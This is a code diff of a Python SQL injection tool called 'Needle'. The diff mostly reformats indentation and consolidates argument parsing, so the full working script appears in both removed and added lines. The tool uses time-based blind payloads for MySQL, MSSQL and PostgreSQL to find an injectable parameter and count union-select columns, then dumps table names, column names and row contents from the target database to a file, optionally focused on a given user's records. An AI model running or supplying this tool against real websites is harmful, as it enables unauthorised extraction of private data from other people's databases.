@@ -30,11 +30,11 @@ SOFTWARE.
 import requests,sys,re,time
 
 #---parse the arguments---
-#display help
 for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-h":
-		print('''Syntax: path_to_script  [-h][-u url][-c cookies][-d distinguisher][-f save_file]
-                    	[-user user][-p parameters][-s valid_search]
+    #display help
+    if sys.argv[i] == "-h":
+        print('''Syntax: path_to_script  [-h][-u url][-c cookies][-d distinguisher][-f save_file]
+                        [-user user][-p parameters][-s valid_search]
 
 Arguments:              -h: display help
                         -u: the url to attempt sql injection to (write http://
@@ -45,47 +45,40 @@ Arguments:              -h: display help
                         -user: the username to login to the site
                         -p: the parameters of the query
                         -s: a valid search''')
-		sys.exit()
-#read the url
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-u":
-		url = sys.argv[i+1]
-#read the cookies if necessary to login
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-c":
-		cookies = {}
-		cookies_list = sys.argv[i+1]
-		cookies_list = cookies_list.split("/")
-		for i in range(0,len(cookies_list)):
-			cook = cookies_list[i].split("=")
-			cookies[cook[0]] = cook[1]
-#read the result distinguisher
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-d":
-		distinguisher = sys.argv[i+1]
-		distinguisher1 = distinguisher.split("DIST")[0]
-		distinguisher2 = distinguisher.split("DIST")[1]
-#file to save results
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-f":
-		file = sys.argv[i+1]
-#user to search for in the results
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-user":
-		user = sys.argv[i+1]
-#read the request parameters
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-p":
-		parameters = {}
-		parameters_string = sys.argv[i+1]
-		parameters_list = parameters_string.split("/")
-		for i in parameters_list:
-			para = i.split("=")
-			parameters[para[0]] = para[1]
-#read the valid search
-for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-s":
-		valid_search = sys.argv[i+1]
+        sys.exit()
+    #read the url
+    if sys.argv[i] == "-u":
+        url = sys.argv[i+1]
+    #read the cookies if necessary to login
+    if sys.argv[i] == "-c":
+        cookies = {}
+        cookies_list = sys.argv[i+1]
+        cookies_list = cookies_list.split("/")
+        for i in range(0,len(cookies_list)):
+            cook = cookies_list[i].split("=")
+            cookies[cook[0]] = cook[1]
+    #read the result distinguisher
+    if sys.argv[i] == "-d":
+        distinguisher = sys.argv[i+1]
+        distinguisher1 = distinguisher.split("DIST")[0]
+        distinguisher2 = distinguisher.split("DIST")[1]
+    #file to save results
+    if sys.argv[i] == "-f":
+        file = sys.argv[i+1]
+    #user to search for in the results
+    if sys.argv[i] == "-user":
+        user = sys.argv[i+1]
+    #read the request parameters
+    if sys.argv[i] == "-p":
+        parameters = {}
+        parameters_string = sys.argv[i+1]
+        parameters_list = parameters_string.split("/")
+        for i in parameters_list:
+            para = i.split("=")
+            parameters[para[0]] = para[1]
+    #read the valid search
+    if sys.argv[i] == "-s":
+        valid_search = sys.argv[i+1]
 
 
 #---declare some variables---
@@ -93,8 +86,8 @@ server = 0
 info = []
 final_info = []
 for key, value in parameters.items():
-	if value == "INJECT":
-		asterisk = key
+    if value == "INJECT":
+        asterisk = key
 
 
 #---sql injection---
@@ -102,307 +95,307 @@ print ("\n---Needle started---")
 #check for mysql injection
 print ("---attempting mysql injection---")
 for injection in "'", '"', "", "')", '")', ")":
-	if injection == "":
-		print ("attempting mysql empty injection...", end = " ")
-	else:
-		print ("attempting mysql " + injection + " injection...", end = " ")
-	query = valid_search + injection + " and 1=sleep(2);#"
-	parameters[asterisk] = query
-	start = time.time()
-	try:
-		cookies
-	except NameError:
-		req = requests.post(url, data=parameters)
-	else:
-		req = requests.post(url, cookies=cookies, data=parameters)
-	end = time.time()
-	if end - start < 3 and end - start > 1.9:
-		print ("SUCCESSFUL")
-		inject = injection
-		server = "mysql"
-		break
-	else:
-		print ("unsuccessful")
+    if injection == "":
+        print ("attempting mysql empty injection...", end = " ")
+    else:
+        print ("attempting mysql " + injection + " injection...", end = " ")
+    query = valid_search + injection + " and 1=sleep(2);#"
+    parameters[asterisk] = query
+    start = time.time()
+    try:
+        cookies
+    except NameError:
+        req = requests.post(url, data=parameters)
+    else:
+        req = requests.post(url, cookies=cookies, data=parameters)
+    end = time.time()
+    if end - start < 3 and end - start > 1.9:
+        print ("SUCCESSFUL")
+        inject = injection
+        server = "mysql"
+        break
+    else:
+        print ("unsuccessful")
 #check for mssql injection
 print ("---attempting mssql injection---")
 for injection in "'", '"', "", "')", '")', ")":
-	if server != 0:
-		break
-	if injection == "":
-		print ("attempting mssql empty injection...", end = " ")
-	else:
-		print ("attempting mssql " + injection + " injection...", end = " ")
-	query = [valid_search + injection + " declare @i int select @i = 0 while @i < 10000000 begin select @i = @i + 1 end print @i--", \
-	valid_search + injection + " waitfor delay \'00:00:02\'--", valid_search + injection + ' waitfor delay \"00:00:02\"--']
-	for i in range (0, len(query)):
-		parameters[asterisk] = query[i]
-		start = time.time()
-		try:
-			cookies
-		except NameError:
-			req = requests.post(url, data=parameters)
-		else:
-			req = requests.post(url, cookies=cookies, data=parameters)
-		end = time.time()
-		if end - start > 1.9:
-			print ("SUCCESSFUL")
-			inject = injection
-			server = "mssql"
-			mssleep = i
-			break
-		elif i == len(query) - 1:
-			print ("unsuccessful")
+    if server != 0:
+        break
+    if injection == "":
+        print ("attempting mssql empty injection...", end = " ")
+    else:
+        print ("attempting mssql " + injection + " injection...", end = " ")
+    query = [valid_search + injection + " declare @i int select @i = 0 while @i < 10000000 begin select @i = @i + 1 end print @i--", \
+    valid_search + injection + " waitfor delay \'00:00:02\'--", valid_search + injection + ' waitfor delay \"00:00:02\"--']
+    for i in range (0, len(query)):
+        parameters[asterisk] = query[i]
+        start = time.time()
+        try:
+            cookies
+        except NameError:
+            req = requests.post(url, data=parameters)
+        else:
+            req = requests.post(url, cookies=cookies, data=parameters)
+        end = time.time()
+        if end - start > 1.9:
+            print ("SUCCESSFUL")
+            inject = injection
+            server = "mssql"
+            mssleep = i
+            break
+        elif i == len(query) - 1:
+            print ("unsuccessful")
 #find the number of columns presented per result for mysql and mssql
 if server in ["mysql", "mssql"]:
-	print ("finding the number of columns presented per result...")
-	j = "null"
-	num_col = 1
-	while True:
-		if server == "mysql":
-			query = valid_search + inject + " and 1=sleep(2) union all select " + j + ";#"
-		elif server == "mssql" and mssleep == 1:
-			query = valid_search + inject + " union all select " + j + " waitfor delay \'00:00:02\'--"
-		elif server == "mssql" and mssleep == 2:
-			query = valid_search + inject + " union all select " + j + " waitfor delay \"00:00:02\"--"
-		parameters[asterisk] = query
-		start = time.time()
-		try:
-			cookies
-		except NameError:
-			req = requests.post(url, data=parameters)
-		else:
-			req = requests.post(url, cookies=cookies, data=parameters)
-		end = time.time()
-		if end - start < 3 and end - start > 1.9:
-			print ("the amount of columns presented per result is : " + str(num_col))
-			break
-		elif num_col == 20:
-			print ("coudn't find the number of columns presented per result, exiting")
-			sys.exit()
-		num_col += 1
-		j += ",null"
+    print ("finding the number of columns presented per result...")
+    j = "null"
+    num_col = 1
+    while True:
+        if server == "mysql":
+            query = valid_search + inject + " and 1=sleep(2) union all select " + j + ";#"
+        elif server == "mssql" and mssleep == 1:
+            query = valid_search + inject + " union all select " + j + " waitfor delay \'00:00:02\'--"
+        elif server == "mssql" and mssleep == 2:
+            query = valid_search + inject + " union all select " + j + " waitfor delay \"00:00:02\"--"
+        parameters[asterisk] = query
+        start = time.time()
+        try:
+            cookies
+        except NameError:
+            req = requests.post(url, data=parameters)
+        else:
+            req = requests.post(url, cookies=cookies, data=parameters)
+        end = time.time()
+        if end - start < 3 and end - start > 1.9:
+            print ("the amount of columns presented per result is : " + str(num_col))
+            break
+        elif num_col == 20:
+            print ("coudn't find the number of columns presented per result, exiting")
+            sys.exit()
+        num_col += 1
+        j += ",null"
 #check for postgresql injection and find the number of columns presented per result
 print ("---attempting postgresql injection---")
 for injection in "'", "", "')", ')':
-	if server != 0:
-		break
-	if injection == "":
-		print ("attempting postgresql empty injection...", end = " ")
-	else:
-		print ("attempting postgresql " + injection + " injection...", end = " ")
-	j = "null"
-	num_col = 1
-	while True:
-		query = valid_search + injection + " union all select " + j + " from pg_sleep(2);--"
-		parameters[asterisk] = query
-		start = time.time()
-		try:
-			cookies
-		except NameError:
-			req = requests.post(url, data=parameters)
-		else:
-			req = requests.post(url, cookies=cookies, data=parameters)
-		end = time.time()
-		if end - start < 3 and end - start > 1.9:
-			print ("SUCCESSFUL")
-			inject = injection
-			server = "postgresql"
-			print ("the amount of columns presented per result is : " + str(num_col))
-			break
-		elif num_col == 20:
-			print ("unsuccessful")
-			break
-		num_col += 1
-		j += ",null"
+    if server != 0:
+        break
+    if injection == "":
+        print ("attempting postgresql empty injection...", end = " ")
+    else:
+        print ("attempting postgresql " + injection + " injection...", end = " ")
+    j = "null"
+    num_col = 1
+    while True:
+        query = valid_search + injection + " union all select " + j + " from pg_sleep(2);--"
+        parameters[asterisk] = query
+        start = time.time()
+        try:
+            cookies
+        except NameError:
+            req = requests.post(url, data=parameters)
+        else:
+            req = requests.post(url, cookies=cookies, data=parameters)
+        end = time.time()
+        if end - start < 3 and end - start > 1.9:
+            print ("SUCCESSFUL")
+            inject = injection
+            server = "postgresql"
+            print ("the amount of columns presented per result is : " + str(num_col))
+            break
+        elif num_col == 20:
+            print ("unsuccessful")
+            break
+        num_col += 1
+        j += ",null"
 #if none of the injections worked exit
 if server == 0:
-	print ("sql injection unsuccessful, exiting")
-	sys.exit()
+    print ("sql injection unsuccessful, exiting")
+    sys.exit()
 #find the type of the columns for postgresql and mssql
 if server in ["postgresql", "mssql"]:
-	print ("finding the type of the columns presented per result...", end = " ")
-	type = str()
-	if server == "postgresql":
-		order_list = ["chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"]
-	elif server == "mssql":
-		order_list = ["char(110) + char(101) + char(101) + char(100) + char(108) + char(101)"]
-	for i in range(0, num_col - 1):
-		order_list.append(",null")
-	count = 0
-	while True:
-		if count > 0:
-			if server == "postgresql":
-				order_list[count] = ",chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"
-			elif server == "mssql":
-				order_list[count] = ",char(110) + char(101) + char(101) + char(100) + char(108) + char(101)"
-		order_str = "".join(order_list)
-		if server == "postgresql":
-			query = valid_search + inject + " union all select " + order_str + " from pg_sleep(2);--"
-		elif server == "mssql" and mssleep == 1:
-			query = valid_search + inject + " union all select " + order_str + " waitfor delay \'00:00:02\'--"
-		elif server == "mssql" and mssleep == 2:
-			query = valid_search + inject + " union all select " + order_str + " waitfor delay \"00:00:02\"--"
-		parameters[asterisk] = query
-		start = time.time()
-		try:
-			cookies
-		except NameError:
-			req = requests.post(url, data=parameters)
-		else:
-			req = requests.post(url, cookies=cookies, data=parameters)
-		end = time.time()
-		if end - start < 3 and end - start > 1.9:
-			if count == 0:
-				type += "\'needle\'"
-			else:
-				type += ",\'needle\'"
-		elif count == 0:
-			order_list[0] = "null"
-			type += "null"
-		else:
-			order_list[count] = ",null"
-			type += ",null"
-		count += 1
-		if count > len(order_list) - 1:
-			break
-	if len(type) > 0:
-		print ("done")
-	else:
-		print ("failed, exiting")
-		sys.exit()
+    print ("finding the type of the columns presented per result...", end = " ")
+    type = str()
+    if server == "postgresql":
+        order_list = ["chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"]
+    elif server == "mssql":
+        order_list = ["char(110) + char(101) + char(101) + char(100) + char(108) + char(101)"]
+    for i in range(0, num_col - 1):
+        order_list.append(",null")
+    count = 0
+    while True:
+        if count > 0:
+            if server == "postgresql":
+                order_list[count] = ",chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"
+            elif server == "mssql":
+                order_list[count] = ",char(110) + char(101) + char(101) + char(100) + char(108) + char(101)"
+        order_str = "".join(order_list)
+        if server == "postgresql":
+            query = valid_search + inject + " union all select " + order_str + " from pg_sleep(2);--"
+        elif server == "mssql" and mssleep == 1:
+            query = valid_search + inject + " union all select " + order_str + " waitfor delay \'00:00:02\'--"
+        elif server == "mssql" and mssleep == 2:
+            query = valid_search + inject + " union all select " + order_str + " waitfor delay \"00:00:02\"--"
+        parameters[asterisk] = query
+        start = time.time()
+        try:
+            cookies
+        except NameError:
+            req = requests.post(url, data=parameters)
+        else:
+            req = requests.post(url, cookies=cookies, data=parameters)
+        end = time.time()
+        if end - start < 3 and end - start > 1.9:
+            if count == 0:
+                type += "\'needle\'"
+            else:
+                type += ",\'needle\'"
+        elif count == 0:
+            order_list[0] = "null"
+            type += "null"
+        else:
+            order_list[count] = ",null"
+            type += ",null"
+        count += 1
+        if count > len(order_list) - 1:
+            break
+    if len(type) > 0:
+        print ("done")
+    else:
+        print ("failed, exiting")
+        sys.exit()
 #find all the tables of the current database
 print ("finding all the tables of the current database...", end = " ")
 if server == "mysql":
-	number = "TABLE_NAME"
-	for i in range(0, num_col - 1):
-		number += "," + "TABLE_NAME"
-	query = valid_search + inject + " union all select " + number + " from information_schema.TABLES where TABLE_SCHEMA = database();#"
+    number = "TABLE_NAME"
+    for i in range(0, num_col - 1):
+        number += "," + "TABLE_NAME"
+    query = valid_search + inject + " union all select " + number + " from information_schema.TABLES where TABLE_SCHEMA = database();#"
 if server == "postgresql":
-	number = type.replace("\'needle\'", 'table_name')
-	query = valid_search + inject + " union all select " + number + \
-	" from information_schema.tables where table_schema not like chr(112) || chr(103) || chr(95) || chr(99) || chr(97) || chr (116) || chr(97) || " + \
-	"chr(108) || chr(111) || chr(103) and table_schema not like chr(105) || chr(110) || chr(102) || chr(111) || chr(114) || chr(109) || chr(97) || " + \
-	"chr(116) || chr(105) || chr(111) || chr(110) || chr(95) || chr(115) || chr(99) || chr(104) || chr(101) || chr(109) || chr(97);--"
+    number = type.replace("\'needle\'", 'table_name')
+    query = valid_search + inject + " union all select " + number + \
+    " from information_schema.tables where table_schema not like chr(112) || chr(103) || chr(95) || chr(99) || chr(97) || chr (116) || chr(97) || " + \
+    "chr(108) || chr(111) || chr(103) and table_schema not like chr(105) || chr(110) || chr(102) || chr(111) || chr(114) || chr(109) || chr(97) || " + \
+    "chr(116) || chr(105) || chr(111) || chr(110) || chr(95) || chr(115) || chr(99) || chr(104) || chr(101) || chr(109) || chr(97);--"
 if server == "mssql":
-	number = type.replace("\'needle\'", 'table_name')
-	query = valid_search + inject + " union all select " + number + " from information_schema.tables--"
+    number = type.replace("\'needle\'", 'table_name')
+    query = valid_search + inject + " union all select " + number + " from information_schema.tables--"
 parameters[asterisk] = query
 try:
-	cookies
+    cookies
 except NameError:
-	req = requests.post(url, data=parameters)
+    req = requests.post(url, data=parameters)
 else:
-	req = requests.post(url, cookies=cookies, data=parameters)
+    req = requests.post(url, cookies=cookies, data=parameters)
 response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
 tables = str()
 for i in response:
-	table_name = i.split(distinguisher1)
-	table_name = table_name[1].split(distinguisher2)
-	table_name = table_name[0]
-	tables += " " + table_name
+    table_name = i.split(distinguisher1)
+    table_name = table_name[1].split(distinguisher2)
+    table_name = table_name[0]
+    tables += " " + table_name
 tables = tables.split()
 if len(tables) > 0:
-	print ("found :", len(tables))
+    print ("found :", len(tables))
 else:
-	print ("failed, exiting")
-	sys.exit()
+    print ("failed, exiting")
+    sys.exit()
 #find all the columns of the current database
 print ("finding all the columns...", end = " ")
 if server == "mysql":
-	number = "COLUMN_NAME"
-	for i in range(0, num_col - 1):
-		number += "," + "COLUMN_NAME"
-	query = valid_search + inject + " union all select " + number + " from information_schema.COLUMNS where TABLE_SCHEMA = database();#"
+    number = "COLUMN_NAME"
+    for i in range(0, num_col - 1):
+        number += "," + "COLUMN_NAME"
+    query = valid_search + inject + " union all select " + number + " from information_schema.COLUMNS where TABLE_SCHEMA = database();#"
 if server == "postgresql":
-	number = type.replace("\'needle\'", 'column_name')
-	query = valid_search + inject + " union all select " + number + \
-	" from information_schema.columns where table_schema not like chr(112) || chr(103) || chr(95) || chr(99) || chr(97) || chr (116) || chr(97) || " + \
-	"chr(108) || chr(111) || chr(103) and table_schema not like chr(105) || chr(110) || chr(102) || chr(111) || chr(114) || chr(109) || chr(97) || " + \
-	"chr(116) || chr(105) || chr(111) || chr(110) || chr(95) || chr(115) || chr(99) || chr(104) || chr(101) || chr(109) || chr(97);--"
+    number = type.replace("\'needle\'", 'column_name')
+    query = valid_search + inject + " union all select " + number + \
+    " from information_schema.columns where table_schema not like chr(112) || chr(103) || chr(95) || chr(99) || chr(97) || chr (116) || chr(97) || " + \
+    "chr(108) || chr(111) || chr(103) and table_schema not like chr(105) || chr(110) || chr(102) || chr(111) || chr(114) || chr(109) || chr(97) || " + \
+    "chr(116) || chr(105) || chr(111) || chr(110) || chr(95) || chr(115) || chr(99) || chr(104) || chr(101) || chr(109) || chr(97);--"
 if server == "mssql":
-	number = type.replace("\'needle\'", 'column_name')
-	query = valid_search + inject + " union all select " + number + " from information_schema.columns--"
+    number = type.replace("\'needle\'", 'column_name')
+    query = valid_search + inject + " union all select " + number + " from information_schema.columns--"
 parameters[asterisk] = query
 try:
-	cookies
+    cookies
 except NameError:
-	req = requests.post(url, data=parameters)
+    req = requests.post(url, data=parameters)
 else:
-	req = requests.post(url, cookies=cookies, data=parameters)
+    req = requests.post(url, cookies=cookies, data=parameters)
 response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
 columns = str()
 for a in response:
-	column_name = a.split(distinguisher1)
-	column_name = column_name[1].split(distinguisher2)
-	column_name = column_name[0]
-	columns += " " + column_name
+    column_name = a.split(distinguisher1)
+    column_name = column_name[1].split(distinguisher2)
+    column_name = column_name[0]
+    columns += " " + column_name
 columns = columns.split()
 if len(columns) > 0:
-	print ("found :", len(columns))
+    print ("found :", len(columns))
 else:
-	print ("failed, exiting")
-	sys.exit()
+    print ("failed, exiting")
+    sys.exit()
 #find all the rows of the current database
 for i in range(0, len(tables)):
-	print ("finding all the rows for table", str(i+1) + "/" + str(len(tables)) + "...")
-	for b in range(0, len(columns)):
-		'''
-		if i % num_col != 0:
-			continue
-		num = columns[i]
-		if len(columns) % 2 != 0 and i == len(columns) - 1:
-			pass
-		else:
-			for j in range(1, num_col):
-				num += "," + columns[i + j]
-		'''
-		if server == "mysql":
-			number = columns[b]
-			for c in range(0, num_col - 1):
-				number += "," + columns[b]
-			query = valid_search + inject + " union all select " + number + " from " + tables[i] + ";#"
-		if server in ["postgresql", "mssql"]:
-			number = type.replace("\'needle\'", columns[b])
-			number = type.replace(",\'needle\'", "," + columns[b])
-			query = valid_search + inject + " union all select " + number + " from " + tables[i] + ";--"
-		parameters[asterisk] = query
-		try:
-			cookies
-		except NameError:
-			req = requests.post(url, data=parameters)
-		else:
-			req = requests.post(url, cookies=cookies, data=parameters)
-		response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
-		rows = str()
-		for d in range(0, len(response)):
-			if d > 0:
-				row = response[d].split(distinguisher1)
-				row = row[1].split(distinguisher2)
-				row = row[0]
-				rows += " " + row
-		rows = rows.split()
-		if len(rows) > 0:
-			info.extend(["Table : " + tables[i] + ", Column: " + columns[b], str(rows)])
+    print ("finding all the rows for table", str(i+1) + "/" + str(len(tables)) + "...")
+    for b in range(0, len(columns)):
+        '''
+        if i % num_col != 0:
+            continue
+        num = columns[i]
+        if len(columns) % 2 != 0 and i == len(columns) - 1:
+            pass
+        else:
+            for j in range(1, num_col):
+                num += "," + columns[i + j]
+        '''
+        if server == "mysql":
+            number = columns[b]
+            for c in range(0, num_col - 1):
+                number += "," + columns[b]
+            query = valid_search + inject + " union all select " + number + " from " + tables[i] + ";#"
+        if server in ["postgresql", "mssql"]:
+            number = type.replace("\'needle\'", columns[b])
+            number = type.replace(",\'needle\'", "," + columns[b])
+            query = valid_search + inject + " union all select " + number + " from " + tables[i] + ";--"
+        parameters[asterisk] = query
+        try:
+            cookies
+        except NameError:
+            req = requests.post(url, data=parameters)
+        else:
+            req = requests.post(url, cookies=cookies, data=parameters)
+        response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
+        rows = str()
+        for d in range(0, len(response)):
+            if d > 0:
+                row = response[d].split(distinguisher1)
+                row = row[1].split(distinguisher2)
+                row = row[0]
+                rows += " " + row
+        rows = rows.split()
+        if len(rows) > 0:
+            info.extend(["Table : " + tables[i] + ", Column: " + columns[b], str(rows)])
 
 
 #---print end result and save results
 if len(info) > 0:
-	print ("sql injection SUCCESSFUL, saving results and exiting")
-	save = open(file, 'a')
-	try:
-		user
-	except NameError:
-		final_info = info
-	else:
-		for i in range(0, len(info)):
-			if user in info[i]:
-				table_column = info[i-1]
-				table = table_column.split(",")[0]
-		for i in range(0, len(info)):
-			if table in info[i]:
-				final_info.extend([info[i], info[i + 1]])
-	for i in final_info:
-		save.write(i + "\n")
-	save.close()
+    print ("sql injection SUCCESSFUL, saving results and exiting")
+    save = open(file, 'a')
+    try:
+        user
+    except NameError:
+        final_info = info
+    else:
+        for i in range(0, len(info)):
+            if user in info[i]:
+                table_column = info[i-1]
+                table = table_column.split(",")[0]
+        for i in range(0, len(info)):
+            if table in info[i]:
+                final_info.extend([info[i], info[i + 1]])
+    for i in final_info:
+        save.write(i + "\n")
+    save.close()
 else:
-	print ("sql injection unsuccessful, exiting...")
+    print ("sql injection unsuccessful, exiting...")
